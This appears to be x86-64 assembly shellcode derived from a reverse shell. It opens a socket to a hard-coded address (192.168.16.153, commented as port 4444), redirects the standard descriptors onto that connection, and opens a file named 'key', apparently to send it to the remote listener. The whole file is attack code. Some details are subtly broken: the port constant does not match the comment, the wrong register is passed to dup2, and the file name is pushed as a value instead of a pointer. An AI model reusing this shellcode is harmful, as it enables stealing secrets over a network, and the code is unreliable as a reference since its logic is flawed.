bits 64
global _start
section .text
_start:

; create socket (from reverse shell code)
  push rbp
  mov rbp,rsp
  xor rdx, rdx
  push 1
  pop rsi
  push 2
  pop rdi
  push 41
  pop rax ; sys_socket
  syscall
  
; make struct and call connect
  sub rsp, 8
  mov dword [rsp], 0xc1df0002 ; Port 4444, 4Bytes: 0xPORT + Fill with '0's + 2
  mov dword [rsp+4], 0x9910a8c0 ; IP Address 192.168.16.153, 4Bytes: 0xIPAddress (Little Endiannes)
  lea rsi, [rsp]
  add rsp, 8
  pop rbx
  xor rbx, rbx
  push 16
  pop rdx
  push 3
  pop rdi
  push 42
  pop rax; sys_connect
  syscall

;dupe connections
  xor r8, r8
  mov r8, 2 ; start at stderr and dup/dec down to zero
  .loop_fd:
      mov rdi, r9
      mov rax, 33 ;dup2
      mov rsi, r8
      syscall
  dec r8
  jns .loop_fd ;jump not sign-> checks sign flag
  
; open the file "key"

l_open:
  push "key"
  pop rdi
  push rbx
  mov rbx, rcx
  mov eax, 2
  syscall
  cmp rax, 0
  jge .end
.end:
  ; rax already holds good fd
  xor r11, r11
  mov r11, dword 0
  mov [rbx], r11  ; set stderr to 0
  pop rbx

loop_in:
  ; read syscall args
  mov edi, 0
  lea rsi, [rsp-1]
  mov rdx, 1
  mov eax, 0 
  syscall

  ; check for input
  cmp rax, 1
  jne end

loop_out:
  ; write syscall args
  mov edi, 1
  lea rsi, [rsp-1]
  mov rdx, 1

  mov eax, 1  ; write to stdout
  syscall

  cmp rax, 1
  jne end

  jmp loop_in ; start over

end:
  ; exit
  mov edi, 0
  mov eax, 60
  syscall

  
